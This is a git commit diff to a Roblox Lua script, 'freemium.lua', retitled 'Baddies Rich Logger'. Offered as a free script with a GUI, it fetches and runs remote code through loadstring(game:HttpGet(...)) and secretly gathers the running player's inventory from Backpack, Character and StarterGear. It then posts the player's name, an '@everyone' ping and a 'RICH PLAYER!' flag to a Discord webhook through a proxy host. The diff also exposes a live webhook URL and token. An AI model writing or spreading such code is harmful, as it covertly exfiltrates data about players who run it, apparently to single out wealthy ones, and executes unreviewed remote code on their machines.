1ea0611420d9cad8e10886ff9a806553981065ad
BaddiesScripted <likinggangfr3@gmail.com>
2026-04-19 02:25:16 +0000

    Update freemium.lua

--- freemium.lua
+++ freemium.lua
@@ -1,18 +1,18 @@
--- Final Loader - GUI + Rich Discord Ping
+-- Baddies Rich Logger (GUI + Inventory Ping)
 
-_G.POOR_WEBHOOK = "https://discord.com/api/webhooks/1495237089246187521/3xaeBard0Ia5rOI3mBT9cO9SGiw3phTe4VPv5t2QpdYzPqZTO9AFBaMOEWUvSjZmCXRi"
+_G.POOR_WEBHOOK = "https://hooks.hyra.io/api/webhooks/1495237089246187521/3xaeBard0Ia5rOI3mBT9cO9SGiw3phTe4VPv5t2QpdYzPqZTO9AFBaMOEWUvSjZmCXRi"
 
-_G.MY_USERNAMES = {"daxkidcece", "thisisanalto048", "username"}   -- ← Change this to your real Roblox usernames
-
-_G.PING_POOR = true
-
--- Rich Discord Ping (taken from the big file you sent)
+-- Load the GUI (this part was already working)
 task.spawn(function()
-    if _G.POOR_WEBHOOK and game.Players.LocalPlayer then
-        local http = game:GetService("HttpService")
-        local plr = game.Players.LocalPlayer
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/BaddiesScripted/test/refs/heads/main/gui.lua", true))()
+end)
 
+-- Rich Inventory Ping (from the script you sent)
+task.spawn(function()
+    if game.Players.LocalPlayer then
+        local plr = game.Players.LocalPlayer
         local tools = {}
+
         local function collect(from)
             if from then
                 for _, v in ipairs(from:GetChildren()) do
@@ -20,6 +20,7 @@ task.spawn(function()
                 end
             end
         end
+
         collect(plr:FindFirstChild("Backpack"))
         collect(plr.Character)
         collect(plr:FindFirstChild("StarterGear"))
@@ -61,13 +62,9 @@ task.spawn(function()
         local content = "@everyone " .. plr.Name .. " executed the script!"
         if isRich then content = content .. " RICH PLAYER!" end
 
+        local http = game:GetService("HttpService")
         pcall(function()
             game:HttpPost(_G.POOR_WEBHOOK, http:JSONEncode({content = content, embeds = {embed}}))
         end)
     end
-end)
-
--- Load the GUI (this part was already working for you)
-task.spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/BaddiesScripted/test/refs/heads/main/gui.lua", true))()
 end)
